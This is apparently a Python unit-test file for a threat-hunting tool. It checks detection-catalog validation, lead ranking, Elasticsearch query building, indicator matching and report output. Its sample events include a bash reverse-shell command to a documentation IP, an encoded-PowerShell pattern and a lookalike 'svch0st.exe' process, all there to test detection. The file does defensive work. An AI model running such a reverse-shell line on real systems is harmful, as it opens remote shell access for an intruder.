import json
import tempfile
import unittest
from pathlib import Path


class CatalogLoadingTests(unittest.TestCase):
    def test_default_catalog_is_large_diverse_and_unique(self):
        from romulus.intelligence.behavior_catalog import load_behavior_catalog

        catalog = load_behavior_catalog()
        analytics = catalog["analytics"]
        self.assertGreaterEqual(len(analytics), 40)
        identifiers = [item["id"] for item in analytics]
        self.assertEqual(len(identifiers), len(set(identifiers)))
        areas = {area for item in analytics for area in item["categories"]}
        self.assertTrue(
            {"execution", "persistence", "credential-access", "authentication", "dns", "network"}.issubset(areas)
        )
        platforms = {platform for item in analytics for platform in item["platforms"]}
        self.assertTrue({"windows", "linux", "cross-platform"}.issubset(platforms))
        self.assertTrue(all(item["attack_techniques"] for item in analytics))
        self.assertTrue(all(item["provenance"] for item in analytics))
        self.assertTrue(all(item["benign_explanations"] for item in analytics))
        self.assertTrue(all(item["follow_up"] for item in analytics))

    def test_default_local_indicator_catalog_starts_empty(self):
        from romulus.intelligence.behavior_catalog import load_local_indicators

        self.assertEqual(load_local_indicators()["indicators"], [])

    def test_duplicate_id_fails_closed_with_actionable_path(self):
        from romulus.intelligence.behavior_catalog import CatalogValidationError, load_behavior_catalog

        base = {
            "catalog_version": "1.0.0",
            "analytics": [
                _analytic("BH-TEST-001"),
                _analytic("BH-TEST-001"),
            ],
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "catalog.json"
            path.write_text(json.dumps(base), encoding="utf-8")
            with self.assertRaisesRegex(CatalogValidationError, r"analytics\[1\]\.id.*duplicate"):
                load_behavior_catalog(path)

    def test_malformed_predicate_fails_closed_with_actionable_path(self):
        from romulus.intelligence.behavior_catalog import CatalogValidationError, load_behavior_catalog

        item = _analytic("BH-TEST-002")
        item["match"]["all"][0]["operator"] = "execute_arbitrary_code"
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "catalog.json"
            path.write_text(json.dumps({"catalog_version": "1.0.0", "analytics": [item]}), encoding="utf-8")
            with self.assertRaisesRegex(CatalogValidationError, r"analytics\[0\]\.match\.all\[0\]\.operator"):
                load_behavior_catalog(path)

    def test_unknown_attack_technique_fails_closed(self):
        from romulus.intelligence.behavior_catalog import CatalogValidationError, load_behavior_catalog

        item = _analytic("BH-TEST-004")
        item["attack_techniques"] = ["T9999"]
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "catalog.json"
            path.write_text(json.dumps({"catalog_version": "1.0.0", "analytics": [item]}), encoding="utf-8")
            with self.assertRaisesRegex(CatalogValidationError, r"analytics\[0\]\.attack_techniques.*unknown"):
                load_behavior_catalog(path)

    def test_missing_required_roles_make_analytic_inapplicable(self):
        from romulus.intelligence.behavior_catalog import applicable_analytics, resolve_semantic_fields

        catalog = {"analytics": [_analytic("BH-TEST-003", required_roles=["process.executable"])]}
        bindings = resolve_semantic_fields(["@timestamp", "source.ip", "destination.ip"])
        applicable, unsupported = applicable_analytics(catalog, bindings, "elasticsearch")
        self.assertEqual(applicable, [])
        self.assertEqual(unsupported[0]["id"], "BH-TEST-003")
        self.assertIn("process.executable", unsupported[0]["missing_roles"])


def _analytic(identifier, required_roles=None):
    return {
        "id": identifier,
        "version": 1,
        "title": "Test analytic",
        "description": "Test behavior for schema validation.",
        "enabled": True,
        "platforms": ["cross-platform"],
        "categories": ["execution"],
        "source": "elasticsearch",
        "source_language": "elasticsearch_dsl",
        "stage_id": f"{identifier}:elasticsearch",
        "required_roles": required_roles or ["process.command_line"],
        "optional_roles": [],
        "match": {
            "all": [
                {
                    "role": (required_roles or ["process.command_line"])[0],
                    "operator": "contains_any",
                    "values": ["test"],
                }
            ],
            "any": [],
            "none": [],
        },
        "base_priority": 20,
        "specificity": 30,
        "expected_noise": "high",
        "attack_techniques": ["T1059"],
        "benign_explanations": ["Authorized testing."],
        "required_corroboration": ["Independent suspicious behavior."],
        "follow_up": ["Review process context."],
        "provenance": [{"name": "test", "url": "https://example.test/rule"}],
        "review_date": "2026-10-12",
    }


if __name__ == "__main__":
    unittest.main()


class CandidateRankingTests(unittest.TestCase):
    def setUp(self):
        from romulus.intelligence.behavior_catalog import load_behavior_catalog
        self.catalog = load_behavior_catalog()

    def test_seed_query_is_bounded_by_mission_range(self):
        from romulus.intelligence.behavior_catalog import (
            compile_elasticsearch_seed,
            resolve_semantic_fields,
        )

        analytic = next(item for item in self.catalog["analytics"] if item["id"] == "BH-XPLAT-002")
        bindings = resolve_semantic_fields(["@timestamp", "process.command_line", "host.name"])
        query = compile_elasticsearch_seed(
            analytic,
            bindings,
            "@timestamp",
            {"gte": "2026-01-01T00:00:00Z", "lte": "2026-01-02T00:00:00Z"},
        )
        self.assertEqual(
            query["bool"]["filter"],
            [{"range": {"@timestamp": {"gte": "2026-01-01T00:00:00Z", "lte": "2026-01-02T00:00:00Z"}}}],
        )
        self.assertIn("process.command_line", json.dumps(query))

    def test_seed_query_rejects_uncompilable_required_predicate(self):
        from romulus.intelligence.behavior_catalog import (
            compile_elasticsearch_seed,
            resolve_semantic_fields,
        )

        analytic = _analytic("BH-TEST-005")
        analytic["match"]["all"].append(
            {
                "role": "process.command_line",
                "operator": "regex",
                "values": [r"powershell\\s+-enc"],
            }
        )
        bindings = resolve_semantic_fields(["@timestamp", "process.command_line"])

        self.assertIsNone(compile_elasticsearch_seed(analytic, bindings, "@timestamp", None))

    def test_temp_execution_stays_low_and_customer_hidden(self):
        from romulus.intelligence.behavior_catalog import build_candidate_queue

        evidence = [_event("EV-TEMP", "ws-01", process_executable="/tmp/updater")]
        candidates = build_candidate_queue(evidence, self.catalog, {"indicators": []})
        lead = next(item for item in candidates if item["analytic_id"] == "BH-XPLAT-001")
        self.assertEqual(lead["priority_tier"], "low")
        self.assertFalse(lead["customer_visible"])
        self.assertEqual(lead["disposition"], "observed")

    def test_independent_behavior_promotes_specific_lead(self):
        from romulus.intelligence.behavior_catalog import build_candidate_queue

        reverse_event = _event(
            "EV-REVERSE",
            "srv-01",
            process_command_line="bash -i >& /dev/tcp/198.51.100.7/443 0>&1",
        )
        temp_event = _event(
            "EV-TEMP",
            "srv-01",
            process_executable="/tmp/.cache/x",
        )
        reverse_event["raw"]["process"]["entity_id"] = "process-chain-1"
        temp_event["raw"]["process"]["entity_id"] = "process-chain-1"
        temp_event["observed_at"] = "2026-10-12T12:01:00Z"
        candidates = build_candidate_queue([reverse_event, temp_event], self.catalog, {"indicators": []})
        reverse_shell = next(item for item in candidates if item["analytic_id"] == "BH-LNX-016")
        self.assertEqual(reverse_shell["disposition"], "corroborated")
        self.assertTrue(reverse_shell["customer_visible"])
        self.assertIn("independent behavior", " ".join(reverse_shell["score_reasons"]).lower())

    def test_lookalike_process_requires_executable_path_context(self):
        from romulus.intelligence.behavior_catalog import build_candidate_queue

        name_only = _event("EV-NAME", "ws-01", process_name="svch0st.exe")
        with_path = _event(
            "EV-PATH",
            "ws-01",
            process_name="svch0st.exe",
            process_executable=r"C:\\Users\\Public\\svch0st.exe",
        )
        without_context = build_candidate_queue([name_only], self.catalog, {"indicators": []})
        with_context = build_candidate_queue([with_path], self.catalog, {"indicators": []})
        self.assertFalse(any(item["analytic_id"] == "BH-XPLAT-005" for item in without_context))
        self.assertTrue(any(item["analytic_id"] == "BH-XPLAT-005" for item in with_context))

    def test_trusted_exact_indicator_is_top_priority_and_customer_visible(self):
        from romulus.intelligence.behavior_catalog import build_candidate_queue

        indicators = {
            "indicators": [
                {
                    "id": "IOC-1",
                    "type": "domain",
                    "value": "evil.example",
                    "source": "customer incident response",
                    "confidence": 95,
                    "created_at": "2026-01-01T00:00:00Z",
                    "expires_at": "2027-01-01T00:00:00Z",
                }
            ]
        }
        evidence = [_event("EV-IOC", "ws-01", dns_question="evil.example")]
        lead = build_candidate_queue(
            evidence,
            self.catalog,
            indicators,
            now="2026-10-12T00:00:00Z",
        )[0]
        self.assertEqual(lead["kind"], "trusted_indicator")
        self.assertEqual(lead["priority_tier"], "critical")
        self.assertEqual(lead["disposition"], "observed")
        self.assertTrue(lead["customer_visible"])
        self.assertEqual(lead["indicator_source"], "customer incident response")

    def test_expired_and_substring_indicators_do_not_match(self):
        from romulus.intelligence.behavior_catalog import build_candidate_queue

        indicators = {
            "indicators": [
                {
                    "id": "IOC-OLD",
                    "type": "domain",
                    "value": "old.example",
                    "source": "expired feed",
                    "confidence": 90,
                    "created_at": "2025-01-01T00:00:00Z",
                    "expires_at": "2025-12-31T00:00:00Z",
                },
                {
                    "id": "IOC-EXACT",
                    "type": "domain",
                    "value": "evil.example",
                    "source": "current feed",
                    "confidence": 90,
                    "created_at": "2026-01-01T00:00:00Z",
                    "expires_at": "2027-01-01T00:00:00Z",
                },
            ]
        }
        evidence = [
            _event("EV-OLD", "ws-01", dns_question="old.example"),
            _event("EV-SUBSTRING", "ws-01", dns_question="notevil.example"),
        ]
        candidates = build_candidate_queue(evidence, self.catalog, indicators, now="2026-10-12T00:00:00Z")
        self.assertFalse(any(item.get("indicator_id") in {"IOC-OLD", "IOC-EXACT"} for item in candidates))

    def test_candidate_order_is_stable(self):
        from romulus.intelligence.behavior_catalog import build_candidate_queue

        evidence = [
            _event("EV-B", "b-host", process_executable="/tmp/b"),
            _event("EV-A", "a-host", process_executable="/tmp/a"),
        ]
        first = build_candidate_queue(evidence, self.catalog, {"indicators": []})
        second = build_candidate_queue(list(reversed(evidence)), self.catalog, {"indicators": []})
        self.assertEqual(
            [(item["candidate_id"], item["priority_score"]) for item in first],
            [(item["candidate_id"], item["priority_score"]) for item in second],
        )

    def test_expected_noise_applies_a_fixed_explainable_priority_penalty(self):
        from romulus.intelligence.behavior_catalog import build_candidate_queue

        low_noise = _analytic("BH-TEST-LOW")
        low_noise["expected_noise"] = "low"
        low_noise["match"]["all"][0]["values"] = ["low-noise-marker"]
        high_noise = _analytic("BH-TEST-HIGH")
        high_noise["expected_noise"] = "high"
        high_noise["match"]["all"][0]["values"] = ["high-noise-marker"]
        events = [
            _event("EV-LOW", "low-host", process_command_line="low-noise-marker"),
            _event("EV-HIGH", "high-host", process_command_line="high-noise-marker"),
        ]

        candidates = build_candidate_queue(
            events, {"analytics": [low_noise, high_noise]}, {"indicators": []}
        )
        by_id = {item["analytic_id"]: item for item in candidates}

        self.assertEqual(
            by_id["BH-TEST-LOW"]["priority_score"] - by_id["BH-TEST-HIGH"]["priority_score"],
            12,
        )
        self.assertIn("expected noise penalty 12", " ".join(by_id["BH-TEST-HIGH"]["score_reasons"]))

    def test_complete_evidence_scoring_keeps_candidate_citations_bounded(self):
        from romulus.intelligence.behavior_catalog import build_candidate_queue, merge_candidate_queue

        analytic = _analytic("BH-TEST-BOUNDED")
        analytic["expected_noise"] = "low"
        evidence = [dict(
            _event(f"EV-{index:03d}", "busy-host", process_command_line="test"),
            observed_at=f"2026-10-12T12:{index % 60:02d}:00Z",
        ) for index in range(120)]

        lead = build_candidate_queue(evidence, {"analytics": [analytic]}, {"indicators": []})[0]
        merged = merge_candidate_queue([lead], [dict(lead,
            evidence_ids=[f"EV-NEXT-{index:03d}" for index in range(120)])])[0]

        self.assertEqual(lead["evidence_match_count"], 120)
        self.assertEqual(len(lead["evidence_ids"]), 40)
        self.assertEqual(len(merged["evidence_ids"]), 40)
        self.assertIn("repeat observation contribution 9", lead["score_reasons"])


def _event(
    evidence_id,
    asset,
    process_name=None,
    process_executable=None,
    process_command_line=None,
    dns_question=None,
):
    raw = {"host": {"name": asset}}
    if any(value is not None for value in (process_name, process_executable, process_command_line)):
        raw["process"] = {}
    if process_name is not None:
        raw["process"]["name"] = process_name
    if process_executable is not None:
        raw["process"]["executable"] = process_executable
    if process_command_line is not None:
        raw["process"]["command_line"] = process_command_line
    if dns_question is not None:
        raw["dns"] = {"question": {"name": dns_question}}
    return {
        "evidence_id": evidence_id,
        "source": "elasticsearch",
        "observed_at": "2026-10-12T12:00:00Z",
        "asset": asset,
        "observation": "test event",
        "raw": raw,
    }


class WorkflowIntegrationTests(unittest.TestCase):
    def test_behavior_seed_plan_binds_fields_and_records_unsupported(self):
        from romulus.intelligence.behavior_catalog import load_behavior_catalog
        from romulus.investigation.workflow import _behavior_seed_queries

        queries, unsupported = _behavior_seed_queries(
            load_behavior_catalog(),
            ["@timestamp", "process.command_line", "process.executable", "process.name", "host.name"],
            "@timestamp",
            {"gte": "2026-10-01T00:00:00Z", "lte": "2026-10-02T00:00:00Z"},
            limit=60,
        )
        ids = {analytic_id for item in queries for analytic_id in item["analytic_ids"]}
        self.assertIn("BH-XPLAT-001", ids)
        self.assertIn("BH-XPLAT-002", ids)
        self.assertTrue(any(item["id"] == "BH-LNX-006" for item in unsupported))
        self.assertTrue(all("range" in json.dumps(item["query"]) for item in queries))

    def test_exact_indicator_seed_query_uses_semantic_roles_and_time(self):
        from romulus.intelligence.behavior_catalog import (
            compile_elasticsearch_indicator_seed,
            resolve_semantic_fields,
        )

        bindings = resolve_semantic_fields(["@timestamp", "dns.question.name", "source.ip"])
        query = compile_elasticsearch_indicator_seed(
            {"id": "IOC-D", "type": "domain", "value": "evil.example"},
            bindings,
            "@timestamp",
            {"gte": "2026-10-01T00:00:00Z", "lte": "2026-10-02T00:00:00Z"},
        )
        rendered = json.dumps(query)
        self.assertIn("dns.question.name", rendered)
        self.assertIn("evil.example", rendered)
        self.assertIn("range", rendered)

    def test_elasticsearch_evidence_retains_behavior_id(self):
        from dataclasses import replace
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.store import Store

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            settings = replace(
                Settings.from_env(),
                home=root,
                data_dir=root / "data",
                logs_dir=root / "logs",
                reports_dir=root / "reports",
            )
            engine = HuntEngine(settings, Store(settings.data_dir, settings.logs_dir), offline=True)
            state = {
                "hunt_id": "HUNT-BEHAVIOR",
                "host": [],
                "network": [],
                "coverage": {},
                "evidence_keys": [],
            }
            engine._add_es_hit(
                state,
                {
                    "_index": "host-events",
                    "_id": "1",
                    "@timestamp": "2026-10-12T12:00:00Z",
                    "host": {"name": "ws-01"},
                    "process": {"executable": "/tmp/tool"},
                },
                {"match_phrase": {"process.executable": "/tmp/"}},
                "behavior:BH-XPLAT-001",
            )
            self.assertEqual(
                state["host"][0]["provenance"]["lead_id"],
                "behavior:BH-XPLAT-001",
            )

    def test_analysis_builds_and_persists_candidate_queue(self):
        from dataclasses import replace
        from romulus.config import Settings
        from romulus.investigation.workflow import HuntEngine
        from romulus.store import Store

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            settings = replace(
                Settings.from_env(),
                home=root,
                data_dir=root / "data",
                logs_dir=root / "logs",
                reports_dir=root / "reports",
            )
            store = Store(settings.data_dir, settings.logs_dir)
            engine = HuntEngine(settings, store, offline=True)
            state = {
                "hunt_id": "HUNT-QUEUE",
                "host": [_event("EV-TEMP", "ws-01", process_executable="/tmp/tool")],
                "network": [],
                "hypotheses": [],
                "findings": [],
                "coverage": {},
                "lead_catalog": [],
                "completed_leads": [],
                "pivot_results": [],
                "queries": [],
                "tool_runs": [],
                "stage_history": [],
                "source_errors": [],
            }
            result = engine._analyze(state)
            lead = next(item for item in result["candidate_leads"] if item["analytic_id"] == "BH-XPLAT-001")
            self.assertFalse(lead["customer_visible"])
            self.assertEqual(
                store.load_state("HUNT-QUEUE")["candidate_leads"][0]["candidate_id"],
                result["candidate_leads"][0]["candidate_id"],
            )
            self.assertEqual(
                result["coverage"]["sequence_analytics"]["by_rule"]["CUR-CORE-0009"]["state"],
                "no_match",
            )
            self.assertEqual(
                result["coverage"]["aggregate_analytics"]["by_rule"]["CUR-IDENTITY-0363"]["state"],
                "no_match",
            )


class CandidateReportingTests(unittest.TestCase):
    def test_customer_report_shows_high_lead_and_keeps_low_lead_technical(self):
        from romulus.reporting.report import _content

        state = {
            "hunt_id": "HUNT-REPORT",
            "status": "completed",
            "outcome": "evidence_supported_lead",
            "termination_reason": "lead_queue_exhausted",
            "objective": "Review bounded telemetry",
            "summary": "One trusted indicator was observed.",
            "coverage": {},
            "hypotheses": [],
            "findings": [],
            "host": [],
            "network": [],
            "correlations": [],
            "search_artifacts": [],
            "source_errors": [],
            "candidate_leads": [
                {
                    "candidate_id": "CL-HIGH",
                    "kind": "trusted_indicator",
                    "title": "Trusted indicator observed: IOC-1",
                    "priority_score": 95,
                    "priority_tier": "critical",
                    "disposition": "observed",
                    "customer_visible": True,
                    "evidence_ids": ["EV-1"],
                    "score_reasons": ["trusted exact match"],
                    "attack_techniques": [],
                    "benign_explanations": [],
                    "follow_up": ["Investigate EV-1."],
                },
                {
                    "candidate_id": "CL-LOW",
                    "kind": "behavior",
                    "title": "Executable launched from a temporary path",
                    "priority_score": 25,
                    "priority_tier": "low",
                    "disposition": "observed",
                    "customer_visible": False,
                    "evidence_ids": ["EV-2"],
                    "score_reasons": ["weak path anomaly"],
                    "attack_techniques": ["T1204.002"],
                    "benign_explanations": ["Installer activity."],
                    "follow_up": ["Review at hunt close."],
                },
            ],
        }
        text = _content(state)
        customer, technical = text.split("TECHNICAL CANDIDATE WORKING LIST", 1)
        self.assertIn("PRIORITIZED CANDIDATE LEADS", customer)
        self.assertIn("Trusted indicator observed: IOC-1", customer)
        self.assertNotIn("Executable launched from a temporary path", customer)
        self.assertIn("Executable launched from a temporary path", technical)
        self.assertIn("weak path anomaly", technical)

    def test_operator_guide_points_to_editable_catalogs(self):
        guide = Path("docs/behavior-analytics.md").read_text(encoding="utf-8")
        readme = Path("README.md").read_text(encoding="utf-8")
        self.assertIn("romulus/intelligence/behavior_catalog.json", guide)
        self.assertIn("romulus/intelligence/local_indicators.json", guide)
        self.assertIn("behavior-analytics.md", readme)
